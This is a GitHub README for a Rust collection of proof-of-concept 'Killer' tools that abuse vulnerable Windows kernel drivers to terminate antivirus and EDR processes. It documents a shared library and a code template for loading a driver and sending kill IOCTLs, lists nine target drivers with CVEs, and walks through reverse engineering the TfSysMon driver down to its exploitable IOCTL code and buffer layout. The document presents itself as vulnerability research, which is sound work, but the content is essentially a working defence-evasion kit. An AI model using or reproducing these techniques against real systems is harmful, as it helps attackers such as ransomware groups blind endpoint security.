# https://github.com/BlackSnufkin/BYOVD

[Skip to content](https://github.com/BlackSnufkin/BYOVD#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/BlackSnufkin/BYOVD) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/BlackSnufkin/BYOVD) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/BlackSnufkin/BYOVD) to refresh your session.Dismiss alert

{{ message }}

[BlackSnufkin](https://github.com/BlackSnufkin)/ **[BYOVD](https://github.com/BlackSnufkin/BYOVD)** Public

- [Notifications](https://github.com/login?return_to=%2FBlackSnufkin%2FBYOVD) You must be signed in to change notification settings
- [Fork\\
89](https://github.com/login?return_to=%2FBlackSnufkin%2FBYOVD)
- [Star\\
575](https://github.com/login?return_to=%2FBlackSnufkin%2FBYOVD)


BYOVD research use cases featuring vulnerable driver discovery and reverse engineering methodology. (CVE-2025-52915, CVE-2025-1055,).


### License

[GPL-3.0 license](https://github.com/BlackSnufkin/BYOVD/blob/main/LICENSE)

[575\\
stars](https://github.com/BlackSnufkin/BYOVD/stargazers) [89\\
forks](https://github.com/BlackSnufkin/BYOVD/forks) [Branches](https://github.com/BlackSnufkin/BYOVD/branches) [Tags](https://github.com/BlackSnufkin/BYOVD/tags) [Activity](https://github.com/BlackSnufkin/BYOVD/activity)

[Star](https://github.com/login?return_to=%2FBlackSnufkin%2FBYOVD)

[Notifications](https://github.com/login?return_to=%2FBlackSnufkin%2FBYOVD) You must be signed in to change notification settings

# BlackSnufkin/BYOVD

main

[**1** Branch](https://github.com/BlackSnufkin/BYOVD/branches) [**0** Tags](https://github.com/BlackSnufkin/BYOVD/tags)

[Go to Branches page](https://github.com/BlackSnufkin/BYOVD/branches)[Go to Tags page](https://github.com/BlackSnufkin/BYOVD/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![BlackSnufkin](https://avatars.githubusercontent.com/u/61916899?v=4&size=40)](https://github.com/BlackSnufkin)[BlackSnufkin](https://github.com/BlackSnufkin/BYOVD/commits?author=BlackSnufkin)<br>[restore PoC & add HVCI warning(](https://github.com/BlackSnufkin/BYOVD/commit/cd3830318dd4cc08ef5600c5675aeb21a2ca5a87) [#6](https://github.com/BlackSnufkin/BYOVD/pull/6) [)](https://github.com/BlackSnufkin/BYOVD/commit/cd3830318dd4cc08ef5600c5675aeb21a2ca5a87)<br>3 days agoFeb 15, 2026<br>[cd38303](https://github.com/BlackSnufkin/BYOVD/commit/cd3830318dd4cc08ef5600c5675aeb21a2ca5a87)¬†¬∑¬†3 days agoFeb 15, 2026<br>## History<br>[97 Commits](https://github.com/BlackSnufkin/BYOVD/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/BlackSnufkin/BYOVD/commits/main/) 97 Commits |
| [BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer "BdApiUtil-Killer") | [BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer "BdApiUtil-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer "CcProtect-Killer") | [CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer "CcProtect-Killer") | [restore PoC & add HVCI warning(](https://github.com/BlackSnufkin/BYOVD/commit/d399c91b15a9c797943a7d76473f4a3576532e2b "restore PoC & add HVCI warning(#6)") [#6](https://github.com/BlackSnufkin/BYOVD/pull/6) [)](https://github.com/BlackSnufkin/BYOVD/commit/d399c91b15a9c797943a7d76473f4a3576532e2b "restore PoC & add HVCI warning(#6)") | 3 days agoFeb 15, 2026 |
| [K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator "K7Terminator") | [K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator "K7Terminator") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer "Ksapi64-Killer") | [Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer "Ksapi64-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer "NSec-Killer") | [NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer "NSec-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer "STProcessMonitor-Killer") | [STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer "STProcessMonitor-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer "TfSysMon-Killer") | [TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer "TfSysMon-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer "Viragt64-Killer") | [Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer "Viragt64-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer "Wsftprm-Killer") | [Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer "Wsftprm-Killer") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [byovd-lib](https://github.com/BlackSnufkin/BYOVD/tree/main/byovd-lib "byovd-lib") | [byovd-lib](https://github.com/BlackSnufkin/BYOVD/tree/main/byovd-lib "byovd-lib") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [.gitignore](https://github.com/BlackSnufkin/BYOVD/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/BlackSnufkin/BYOVD/blob/main/.gitignore ".gitignore") | [Refactor: Cargo workspace + byovd-lib shared library](https://github.com/BlackSnufkin/BYOVD/commit/23ea75119edce25f0da78f3b7e1fe874b69865ca "Refactor: Cargo workspace + byovd-lib shared library") | last weekFeb 12, 2026 |
| [Cargo.toml](https://github.com/BlackSnufkin/BYOVD/blob/main/Cargo.toml "Cargo.toml") | [Cargo.toml](https://github.com/BlackSnufkin/BYOVD/blob/main/Cargo.toml "Cargo.toml") | [restore PoC & add HVCI warning(](https://github.com/BlackSnufkin/BYOVD/commit/d399c91b15a9c797943a7d76473f4a3576532e2b "restore PoC & add HVCI warning(#6)") [#6](https://github.com/BlackSnufkin/BYOVD/pull/6) [)](https://github.com/BlackSnufkin/BYOVD/commit/d399c91b15a9c797943a7d76473f4a3576532e2b "restore PoC & add HVCI warning(#6)") | 3 days agoFeb 15, 2026 |
| [LICENSE](https://github.com/BlackSnufkin/BYOVD/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/BlackSnufkin/BYOVD/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/BlackSnufkin/BYOVD/commit/225b13e325aca01bc5d3065f4c61260a2e2d60a8 "Initial commit") | 3 years agoDec 5, 2023 |
| [README.md](https://github.com/BlackSnufkin/BYOVD/blob/main/README.md "README.md") | [README.md](https://github.com/BlackSnufkin/BYOVD/blob/main/README.md "README.md") | [restore PoC & add HVCI warning(](https://github.com/BlackSnufkin/BYOVD/commit/cd3830318dd4cc08ef5600c5675aeb21a2ca5a87 "restore PoC & add HVCI warning(#6)") [#6](https://github.com/BlackSnufkin/BYOVD/pull/6) [)](https://github.com/BlackSnufkin/BYOVD/commit/cd3830318dd4cc08ef5600c5675aeb21a2ca5a87 "restore PoC & add HVCI warning(#6)") | 3 days agoFeb 15, 2026 |
| View all files |

## Repository files navigation

[![cropped-Aug 28, 2025, 03_39_19 PM](https://private-user-images.githubusercontent.com/61916899/483153706-3d4b6944-770c-47c8-883b-f4d9bb90eb4d.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTM3MjMsIm5iZiI6MTc3MTQxMzQyMywicGF0aCI6Ii82MTkxNjg5OS80ODMxNTM3MDYtM2Q0YjY5NDQtNzcwYy00N2M4LTg4M2ItZjRkOWJiOTBlYjRkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMTcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZhNGU4YjFjZTE5MmQxNTVlZmZkYTU2ODI3OTZmNWE4ZmI0NDI5MmNmY2I3Y2ViZDIwZTZkODZiYzk1Y2YyN2QmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.h8D8HvuzECmpyYYYFdEzD2ci37suLt5px4PX5rpSR4Y)](https://private-user-images.githubusercontent.com/61916899/483153706-3d4b6944-770c-47c8-883b-f4d9bb90eb4d.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTM3MjMsIm5iZiI6MTc3MTQxMzQyMywicGF0aCI6Ii82MTkxNjg5OS80ODMxNTM3MDYtM2Q0YjY5NDQtNzcwYy00N2M4LTg4M2ItZjRkOWJiOTBlYjRkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMTcwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZhNGU4YjFjZTE5MmQxNTVlZmZkYTU2ODI3OTZmNWE4ZmI0NDI5MmNmY2I3Y2ViZDIwZTZkODZiYzk1Y2YyN2QmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.h8D8HvuzECmpyYYYFdEzD2ci37suLt5px4PX5rpSR4Y)

**BYOVD** is a collection of PoCs demonstrating how vulnerable drivers can be exploited to disable AV/EDR solutions.

The collection includes both undocumented drivers and those with existing coverage in [LOLDDrivers](https://www.loldrivers.io/) or [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules).

* * *

> Since its initial discovery, the TfSysMon driver has been added to LOLDrivers and abused by ransomware groups using the **EDRKillShifter** tool, as reported by [Sophos](https://news.sophos.com/en-us/2024/08/14/edr-kill-shifter/) & [ESET](https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/)

* * *

## üìö Table of Contents

[Permalink: üìö Table of Contents](https://github.com/BlackSnufkin/BYOVD#-table-of-contents)

- [üîç Overview](https://github.com/BlackSnufkin/BYOVD#-overview)
- [üèóÔ∏è Project Structure](https://github.com/BlackSnufkin/BYOVD#%EF%B8%8F-project-structure)
- [üîß Building](https://github.com/BlackSnufkin/BYOVD#-building)
- [üì¶ byovd-lib](https://github.com/BlackSnufkin/BYOVD#-byovd-lib)
- [üí° POCs](https://github.com/BlackSnufkin/BYOVD#-pocs)
- [üî¨ Complete Driver Reverse Engineering Process (x64)](https://github.com/BlackSnufkin/BYOVD#-complete-driver-reverse-engineering-process-x64)
- [üîó References](https://github.com/BlackSnufkin/BYOVD#-references)
- [‚ö†Ô∏è Disclaimer](https://github.com/BlackSnufkin/BYOVD#%EF%B8%8F-disclaimer)

## üîç Overview

[Permalink: üîç Overview](https://github.com/BlackSnufkin/BYOVD#-overview)

The **BYOVD technique** has recently gained popularity in offensive security, particularly with the release of tools such as SpyBoy's _Terminator_ (sold for $3,000) and the _ZeroMemoryEx Blackout_ project. These tools capitalize on vulnerable drivers to disable AV/EDR agents, facilitating further attacks by reducing detection.

This repository contains several PoCs developed for educational purposes, helping researchers understand how these drivers can be abused to terminate processes.

## üèóÔ∏è Project Structure

[Permalink: üèóÔ∏è Project Structure](https://github.com/BlackSnufkin/BYOVD#%EF%B8%8F-project-structure)

The project is organized as a **Rust Cargo workspace**. All PoCs share a common library (`byovd-lib`) that handles the boilerplate: driver service lifecycle, IOCTL dispatch, process monitoring, and cleanup. Each killer is a thin binary (~50-100 lines) that only defines its driver-specific configuration.

```
BYOVD/
‚îú‚îÄ‚îÄ Cargo.toml                        # Workspace root
‚îú‚îÄ‚îÄ byovd-lib/                        # Shared library
‚îÇ   ‚îî‚îÄ‚îÄ src/lib.rs
‚îú‚îÄ‚îÄ BdApiUtil-Killer/                  # Uses byovd-lib
‚îú‚îÄ‚îÄ CcProtectt-Killer/                 # Uses byovd-lib
‚îú‚îÄ‚îÄ K7Terminator/                      # Standalone (LPE + BYOVD modes)
‚îú‚îÄ‚îÄ Ksapi64-Killer/                    # Uses byovd-lib
‚îú‚îÄ‚îÄ NSec-Killer/                       # Uses byovd-lib
‚îú‚îÄ‚îÄ STProcessMonitor-Killer/           # Uses byovd-lib (combined v114 + v2618)
‚îú‚îÄ‚îÄ TfSysMon-Killer/                   # Uses byovd-lib
‚îú‚îÄ‚îÄ Viragt64-Killer/                   # Uses byovd-lib
‚îî‚îÄ‚îÄ Wsftprm-Killer/                    # Uses byovd-lib
```

## üîß Building

[Permalink: üîß Building](https://github.com/BlackSnufkin/BYOVD#-building)

**Prerequisites:** Rust toolchain and Visual Studio Build Tools with the Windows SDK.

```
# Build all tools (release, optimized + stripped)
cargo build --release

# Build a single tool
cargo build --release -p BdApiUtil-Killer

# Build multiple specific tools
cargo build --release -p NSec-Killer -p Wsftprm-Killer
```

Binaries are output to `target/release/`. Copy the corresponding `.sys` driver file into the same directory as the executable before running.

## üì¶ byovd-lib

[Permalink: üì¶ byovd-lib](https://github.com/BlackSnufkin/BYOVD#-byovd-lib)

`byovd-lib` is the shared library that all PoCs (except K7Terminator) are built on. It provides:

- **`DriverConfig` trait** \-\- each PoC implements this to define its driver name, `.sys` filename, device path, IOCTL code, and input buffer format.
- **`DriverManager`** \-\- RAII-based service lifecycle management (create, start, stop, delete).
- **`ServiceHandle` / `FileHandle`** \-\- RAII wrappers that auto-close Windows handles on drop.
- **`send_ioctl()`** \-\- opens the driver device and dispatches the kill IOCTL.
- **`run_monitor()`** \-\- continuously scans for the target process by name and sends the kill IOCTL when found (Ctrl+C to stop).
- **`run()`** \-\- the full BYOVD flow: preflight checks, load driver, monitor & kill, cleanup.
- **Helpers** \-\- `get_pid_by_name()`, `ensure_running_as_local_system()`, `to_wstring()`.

Adding a new driver PoC is straightforward -- implement the trait and call `byovd_lib::run()`:

```
use byovd_lib::{DriverConfig, Result};
use clap::Parser;

struct MyDriver;
impl DriverConfig for MyDriver {
    fn driver_name(&self) -> &str { "MyDriver" }
    fn driver_file(&self) -> &str { "mydriver.sys" }
    fn device_path(&self) -> &str { "\\\\.\\MyDevice" }
    fn ioctl_code(&self) -> u32 { 0xDEAD }
    fn build_ioctl_input(&self, pid: u32, _name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }
}

#[derive(Parser)]
struct Cli {
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&MyDriver, &cli.process_name, None)
}
```

Optional trait overrides with their defaults:

| Method | Default | Purpose |
| --- | --- | --- |
| `device_access()` | `SERVICE_ALL_ACCESS` | `CreateFileW` access flags |
| `skip_unload()` | `false` | Skip driver cleanup (e.g., drivers that BSOD on unload) |
| `ignore_ioctl_error()` | `false` | Treat IOCTL failure as success (e.g., NSecKrnl) |
| `ioctl_output_size()` | `0` | Expected output buffer size |
| `preflight_check()` | `Ok(())` | Pre-launch validation (e.g., LocalSystem check) |

## üí° POCs

[Permalink: üí° POCs](https://github.com/BlackSnufkin/BYOVD#-pocs)

Below are the drivers and their respective PoCs available in this repository:

- **[BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer)**: Targets `BdApiUtil64.sys` from `Baidu AntiVirus` (CVE-2024-51324).
- **[CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer)**: Targets `CcProtect.sys` from `CnCrypt`.
- **[K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator)**: Targets `K7RKScan.sys` from `K7 Computing` (CVE-2025-52915, CVE-2025-1055) -- [Full write-up](https://blacksnufkin.github.io/posts/BYOVD-CVE-2025-52915/).
- **[Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer)**: Targets `ksapi64.sys` / `ksapi64_del.sys` from `Kingsoft Corporation`.
- **[NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer)**: Targets `NSecKrnl.sys` from `NSEC` (ValleyRAT BYOVD reproduction).
- **[STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer)**: Targets `STProcessMonitor.sys` from `Safetica` (CVE-2025-70795, supports v11.11.4 and v11.26.18).
- **[TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer)**: Targets `sysmon.sys` from `ThreatFire System Monitor`.
- **[Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer)**: Targets `viragt64.sys` from `Tg Soft`.
- **[Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer)**: Targets `wsftprm.sys` from `Topaz Antifraud` (CVE-2023-52271).

## üî¨ Complete Driver Reverse Engineering Process (x64)

[Permalink: üî¨ Complete Driver Reverse Engineering Process (x64)](https://github.com/BlackSnufkin/BYOVD#-complete-driver-reverse-engineering-process-x64)

This section demonstrates the complete A-Z reverse engineering methodology using the TfSysMon driver as a practical example. This process applies to any x64 Windows kernel driver analysis.

## üéØ Step 0: Pre-Analysis - Function Import Screening

[Permalink: üéØ Step 0: Pre-Analysis - Function Import Screening](https://github.com/BlackSnufkin/BYOVD#-step-0-pre-analysis---function-import-screening)

Check driver imports before starting reverse engineering.

A basic process killer driver requires 2 things:

a way to get a handle on a process (for instance **ZwOpenProcess** or **NtOpenProcess**)

a way to terminate the process (for instance **ZwTerminateProcess** or **NtTerminateProcess**)

Check if a driver imports both function types. If a driver has in its imported functions Nt/ZwOpenProcess AND Nt/ZwTerminateProcess then it's a potential process killer driver candidate.

Only after confirming these imports should you proceed to detailed reverse engineering in IDA Pro.

### üõ†Ô∏è Prerequisites for x64 Driver Analysis

[Permalink: üõ†Ô∏è Prerequisites for x64 Driver Analysis](https://github.com/BlackSnufkin/BYOVD#%EF%B8%8F-prerequisites-for-x64-driver-analysis)

**Required Tools:**

- **IDA Pro** \- for disassembling the driver for static analysis
- **OSRLoader** \- for loading/running the driver (alternative to sc.exe command)

### üìç Step 1: Locate and Analyze DriverEntry

[Permalink: üìç Step 1: Locate and Analyze DriverEntry](https://github.com/BlackSnufkin/BYOVD#-step-1-locate-and-analyze-driverentry)

**Every Windows driver starts with DriverEntry - find this function first:**

In TfSysMon, the DriverEntry looks like this:

```
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
  unsigned __int64 v2; // rax
  v2 = BugCheckParameter2;
  if ( !BugCheckParameter2 || BugCheckParameter2 == 0x2B992DDFA232LL )
  {
    v2 = ((unsigned __int64)&BugCheckParameter2 ^ MEMORY[0xFFFFF78000000320]) & 0xFFFFFFFFFFFFLL;
    if ( !v2 )
      v2 = 0x2B992DDFA232LL;
    BugCheckParameter2 = v2;
  }
  BugCheckParameter3 = ~v2;
  return sub_17484(DriverObject);
}
```

**Analysis Notes:**

- The code performs some initialization with BugCheckParameter2 and BugCheckParameter3
- The real driver initialization happens in `sub_17484`
- Follow the call to `sub_17484(DriverObject)` \- this is where actual driver setup occurs

### üìç Step 2: Follow Driver Initialization Chain

[Permalink: üìç Step 2: Follow Driver Initialization Chain](https://github.com/BlackSnufkin/BYOVD#-step-2-follow-driver-initialization-chain)

**Navigate to the initialization function (`sub_17484`):**

```
NTSTATUS __fastcall sub_17484(PDRIVER_OBJECT DriverObject, unsigned __int16 *a2)
{
  // ... initialization code ...

  RtlInitUnicodeString(&DestinationString, L"\\Device\\TfSysMon");
  result = IoCreateDevice(DriverObject, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
  if ( result < 0 )
    return result;

  qword_1D5D8 = 0;
  dword_1D5D0 = 1;
  DriverObject->MajorFunction[15] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[18] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_17694;

  RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\TfSysMon");
  v6 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
  // ... rest of function ...
}
```

**Key Reverse Engineering Findings:**

- **Device Name**: `\\Device\\TfSysMon` (kernel space)
- **Symbolic Link**: `\\DosDevices\\TfSysMon` (user-mode accessible as `\\.\\TfSysMon`)
- **Device Type**: `0x22` = FILE\_DEVICE\_UNKNOWN
- **IRP Handler**: All major functions point to `sub_17694`
- **Target Function**: MajorFunction\[14\] = IRP\_MJ\_DEVICE\_CONTROL handler

### üìç Step 3: Analyze the IRP Dispatch Function

[Permalink: üìç Step 3: Analyze the IRP Dispatch Function](https://github.com/BlackSnufkin/BYOVD#-step-3-analyze-the-irp-dispatch-function)

**Navigate to the dispatch function (`sub_17694`):**

```
__int64 __fastcall sub_17694(struct _DEVICE_OBJECT *a1, IRP *a2)
{
  struct _IO_STACK_LOCATION *CurrentStackLocation; // rdx
  unsigned int v4; // ebx

  if ( a1 != DeviceObject )
  {
    v4 = -1073741790;
    goto LABEL_20;
  }
  CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
  v4 = 0;
  if ( !CurrentStackLocation->MajorFunction )
  {
    // Handle IRP_MJ_CREATE
  }
  else if ( CurrentStackLocation->MajorFunction == 2 )
  {
    // Handle IRP_MJ_CLOSE
  }
  else if ( CurrentStackLocation->MajorFunction <= 0xDu )
  {
    goto LABEL_7;
  }
  else if ( CurrentStackLocation->MajorFunction <= 0xFu )
  {
    v4 = sub_177D8(a2);  // THIS IS THE IOCTL HANDLER
    goto LABEL_20;
  }
  // ... rest of function
}
```

**Reverse Engineering Analysis:**

- Device validation occurs first (`if ( a1 != DeviceObject )`)
- `CurrentStackLocation->MajorFunction` determines the operation type
- **CRITICAL**: MajorFunction values 14 (0xE) and 15 (0xF) call `sub_177D8`
- MajorFunction 14 = IRP\_MJ\_DEVICE\_CONTROL = IOCTL processing
- The vulnerable code path is: **IOCTL request ‚Üí sub\_177D8**

### üìç Step 4: Reverse Engineer the IOCTL Handler

[Permalink: üìç Step 4: Reverse Engineer the IOCTL Handler](https://github.com/BlackSnufkin/BYOVD#-step-4-reverse-engineer-the-ioctl-handler)

**Navigate to the IOCTL processing function (`sub_177D8`):**

```
__int64 __fastcall sub_177D8(PIRP Irp, __int64 a2, __int64 a3, __int64 a4)
{
  // ... variable declarations ...

  v7 = *(_DWORD *)(a2 + 24);  // Extract IOCTL code
  MasterIrp = Irp->AssociatedIrp.MasterIrp;  // Input buffer
  v9 = *(unsigned int *)(a2 + 16);  // InputBufferLength
  v10 = *(_DWORD *)(a2 + 8);  // OutputBufferLength

  if ( v7 > 0xB4A00070 )
  {
    if ( v7 > 0xB4A000F8 )
    {
      if ( v7 != -1264582404 )
      {
        switch ( v7 )
        {
          // ... various cases ...
          case 0xB4A00404:  // VULNERABLE IOCTL CODE
            if ( (unsigned int)v9 >= 0x18 )
              return (unsigned int)sub_1837C((__int64)Irp->AssociatedIrp.MasterIrp);
            break;
          // ... more cases ...
        }
      }
    }
  }
  // ... rest of function
}
```

**Critical Reverse Engineering Discoveries:**

- **IOCTL Extraction**: `v7 = *(_DWORD *)(a2 + 24)` gets the IOCTL code from IO\_STACK\_LOCATION
- **Input Buffer**: `Irp->AssociatedIrp.MasterIrp` contains user data
- **Buffer Length**: `v9 = *(unsigned int *)(a2 + 16)` gets input buffer size
- **Vulnerable IOCTL**: `0xB4A00404` leads to `sub_1837C`
- **Size Check**: Only validates buffer ‚â• 0x18 (24 bytes) - minimal validation!

### üìç Step 5: Analyze the Vulnerable Function

[Permalink: üìç Step 5: Analyze the Vulnerable Function](https://github.com/BlackSnufkin/BYOVD#-step-5-analyze-the-vulnerable-function)

**Navigate to the process termination function (`sub_1837C`):**

```
__int64 __fastcall sub_1837C(__int64 a1)
{
  unsigned int v2; // ebx
  void *v3; // rax
  unsigned int v4; // edi
  NTSTATUS v6; // eax
  // ... variable declarations ...

  v2 = 0;
  if ( MmIsAddressValid((PVOID)a1) )
  {
    v3 = *(void **)(a1 + 4);  // EXTRACT PID FROM OFFSET +4
    v4 = 0;
    if ( !v3 )
      return 3221225485LL;
    memset(&ObjectAttributes.RootDirectory, 0, 20);
    ObjectAttributes.SecurityDescriptor = 0;
    ObjectAttributes.SecurityQualityOfService = 0;
    ClientId.UniqueThread = 0;
    ObjectAttributes.Length = 48;
    ClientId.UniqueProcess = v3;  // SET TARGET PID
    while ( 1 )
    {
      v6 = ZwOpenProcess(&ProcessHandle, 1u, &ObjectAttributes, &ClientId);
      v7 = v6 < 0;
      v2 = v6;
      if ( !v6 )
        break;
      v8 = v4++;
      if ( v8 >= 3 )
      {
        v7 = v6 < 0;
        break;
      }
    }
    if ( !v7 )
    {
      v9 = 0;
      do
      {
        v2 = ZwTerminateProcess(ProcessHandle, 0);  // TERMINATE PROCESS
        if ( !v2 )
          break;
        v10 = v9++;
      }
      while ( v10 < 3 );
      ZwClose(ProcessHandle);
    }
  }
  return v2;
}
```

**Function Analysis:**

- **Input Structure**: From the driver code analysis, we determined the buffer layout where PID is at offset +4
- **Input Parsing**: `v3 = *(void **)(a1 + 4)` extracts PID from input buffer at offset +4
- **Process Opening**: `ZwOpenProcess` with minimal access rights (1u = PROCESS\_TERMINATE)
- **No Security Checks**: No validation of caller privileges or target process protection
- **Process Termination**: Direct call to `ZwTerminateProcess`
- **Retry Logic**: Multiple attempts for both opening and termination
- **Any Process**: Can terminate any process accessible to SYSTEM account

### üìç Step 6: Map the Complete Attack Chain

[Permalink: üìç Step 6: Map the Complete Attack Chain](https://github.com/BlackSnufkin/BYOVD#-step-6-map-the-complete-attack-chain)

**Complete Reverse Engineering Flow:**

1. **Entry Point**: User calls `DeviceIoControl` on `\\.\\TfSysMon`
2. **IRP Creation**: I/O Manager creates IRP with MajorFunction = 14
3. **Dispatch**: `sub_17694` routes to `sub_177D8` for IOCTL processing
4. **IOCTL Check**: `sub_177D8` validates IOCTL code `0xB4A00404` and buffer size ‚â• 24 bytes
5. **Execution**: Calls `sub_1837C` with user input buffer
6. **Termination**: `sub_1837C` extracts PID from offset +4 and terminates process via `ZwTerminateProcess`

**Input Buffer Structure (from driver reverse engineering):**

```
Offset 0x00-0x03: [padding] - 4 bytes
Offset 0x04-0x07: [Target Process ID] - 4 bytes (DWORD)
Offset 0x08-0x17: [extra_padding] - 16 bytes
Total Size: 24 bytes (0x18) - matches driver's minimum size check
```

